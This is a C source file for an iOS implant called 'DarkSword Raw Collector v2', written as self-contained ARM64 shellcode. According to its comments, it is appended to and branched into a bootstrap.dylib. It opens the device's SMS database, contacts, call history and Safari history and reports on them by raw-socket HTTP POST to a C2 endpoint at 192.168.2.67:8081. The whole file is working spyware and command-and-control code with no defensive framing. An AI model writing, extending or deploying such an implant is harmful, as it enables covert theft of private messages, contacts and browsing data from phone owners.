/**
 * DarkSword Raw Collector v2 - FULLY self-contained
 * NO libc, NO frameworks, NO relocations
 * All string functions implemented inline
 * Only raw ARM64 syscalls
 * 
 * This gets appended to bootstrap.dylib's __TEXT and branched to
 * from the end of _process.
 */

/* === Inline string functions (no libc) === */
static int _strlen(const char *s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}

static void _memcpy(char *dst, const char *src, int n) {
    for (int i = 0; i < n; i++) dst[i] = src[i];
}

static int _strcmp(const char *a, const char *b) {
    while (*a && *b && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

/* Minimal itoa */
static int _itoa(int val, char *buf) {
    int i = 0, j, len;
    char tmp[16];
    if (val == 0) { buf[0] = '0'; buf[1] = 0; return 1; }
    if (val < 0) { buf[i++] = '-'; val = -val; }
    int t = 0;
    while (val > 0) { tmp[t++] = '0' + (val % 10); val /= 10; }
    len = i;
    for (j = t - 1; j >= 0; j--) buf[i++] = tmp[j];
    buf[i] = 0;
    return i;
}

/* Minimal snprintf-like for our needs */
static int _strcat(char *dst, const char *src) {
    int d = _strlen(dst);
    int i = 0;
    while (src[i]) { dst[d + i] = src[i]; i++; }
    dst[d + i] = 0;
    return d + i;
}

/* === Raw syscalls === */
static long _syscall0(long n) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0");
    __asm__ volatile("svc #0x80" : "=r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _syscall1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _syscall2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _syscall3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}
static long _syscall4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory");
    return x0;
}

/* iOS syscall numbers */
#define SYS_open 5
#define SYS_read 3
#define SYS_close 6
#define SYS_socket 97
#define SYS_connect 98
#define SYS_send 133
#define SYS_write 4

/* HTTP POST via raw socket */
static void _http_post(const char *body, int body_len) {
    /* Build HTTP request */
    char http[4096];
    char lenbuf[16];
    _itoa(body_len, lenbuf);
    
    int h = 0;
    const char *hdr = "POST /api/v1/c2/report HTTP/1.1\r\nHost: 192.168.2.67:8081\r\nContent-Type: application/json\r\nContent-Length: ";
    _memcpy(http + h, hdr, _strlen(hdr)); h += _strlen(hdr);
    _memcpy(http + h, lenbuf, _strlen(lenbuf)); h += _strlen(lenbuf);
    const char *tail = "\r\nConnection: close\r\n\r\n";
    _memcpy(http + h, tail, _strlen(tail)); h += _strlen(tail);
    if (h + body_len < sizeof(http)) {
        _memcpy(http + h, body, body_len);
        h += body_len;
    }
    
    int sock = (int)_syscall3(SYS_socket, 2, 1, 0);
    if (sock < 0) return;
    
    /* sockaddr_in: 192.168.2.67:8081 */
    unsigned char addr[16];
    for (int i = 0; i < 16; i++) addr[i] = 0;
    addr[0] = 2; addr[1] = 0;              /* AF_INET */
    addr[2] = 0x1f; addr[3] = 0x90;         /* port 8081 */
    addr[4] = 192; addr[5] = 168; addr[6] = 2; addr[7] = 67;  /* IP */
    
    _syscall3(SYS_connect, sock, (long)addr, 16);
    _syscall4(SYS_send, sock, (long)http, h, 0);
    _syscall1(SYS_close, sock);
}

/* Report a simple platform/username/token */
static void _report(const char *platform, const char *username, const char *token) {
    char body[2048];
    int bl = 0;
    const char *p1 = "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\",\"data\":{\"platform\":\"";
    _memcpy(body + bl, p1, _strlen(p1)); bl += _strlen(p1);
    _memcpy(body + bl, platform, _strlen(platform)); bl += _strlen(platform);
    const char *p2 = "\",\"username\":\"";
    _memcpy(body + bl, p2, _strlen(p2)); bl += _strlen(p2);
    _memcpy(body + bl, username, _strlen(username)); bl += _strlen(username);
    const char *p3 = "\",\"token\":\"";
    _memcpy(body + bl, p3, _strlen(p3)); bl += _strlen(p3);
    _memcpy(body + bl, token, _strlen(token)); bl += _strlen(token);
    const char *p4 = "\"}}";
    _memcpy(body + bl, p4, _strlen(p4)); bl += _strlen(p4);
    body[bl] = 0;
    
    _http_post(body, bl);
}

/* Read file via raw syscalls, report byte count */
static void _collect_file(const char *path, const char *platform) {
    int fd = (int)_syscall2(SYS_open, (long)path, 0);
    if (fd < 0) {
        char buf[512];
        int bl = 0;
        const char *s1 = "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\",\"data\":{\"platform\":\"";
        _memcpy(buf + bl, s1, _strlen(s1)); bl += _strlen(s1);
        _memcpy(buf + bl, platform, _strlen(platform)); bl += _strlen(platform);
        const char *s2 = "\",\"username\":\"access_denied\",\"token\":\"";
        _memcpy(buf + bl, s2, _strlen(s2)); bl += _strlen(s2);
        _memcpy(buf + bl, path, _strlen(path)); bl += _strlen(path);
        const char *s3 = "\"}}";
        _memcpy(buf + bl, s3, _strlen(s3)); bl += _strlen(s3);
        buf[bl] = 0;
        _http_post(buf, bl);
        return;
    }
    
    char data[16384];
    int n = (int)_syscall3(SYS_read, fd, (long)data, sizeof(data) - 1);
    _syscall1(SYS_close, fd);
    if (n <= 0) n = 0;
    data[n] = 0;
    
    /* Report success with byte count */
    char body[512];
    char cnt[16];
    _itoa(n, cnt);
    int bl = 0;
    const char *s1 = "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\",\"data\":{\"platform\":\"";
    _memcpy(body + bl, s1, _strlen(s1)); bl += _strlen(s1);
    _memcpy(body + bl, platform, _strlen(platform)); bl += _strlen(platform);
    const char *s2 = "\",\"username\":\"read_success\",\"token\":\"";
    _memcpy(body + bl, s2, _strlen(s2)); bl += _strlen(s2);
    _memcpy(body + bl, cnt, _strlen(cnt)); bl += _strlen(cnt);
    const char *s3 = " bytes\"}}";
    _memcpy(body + bl, s3, _strlen(s3)); bl += _strlen(s3);
    body[bl] = 0;
    _http_post(body, bl);
}

/* === Entry point - branched to from end of _process === */
void ds_collect(void) {
    _report("RawCollector", "started", "v2");
    _collect_file("/var/mobile/Library/SMS/sms.db", "SMS");
    _collect_file("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", "Contacts");
    _collect_file("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", "CallHistory");
    _collect_file("/var/mobile/Library/Safari/History.db", "Safari");
    _report("RawCollector", "done", "all_files_attempted");
}
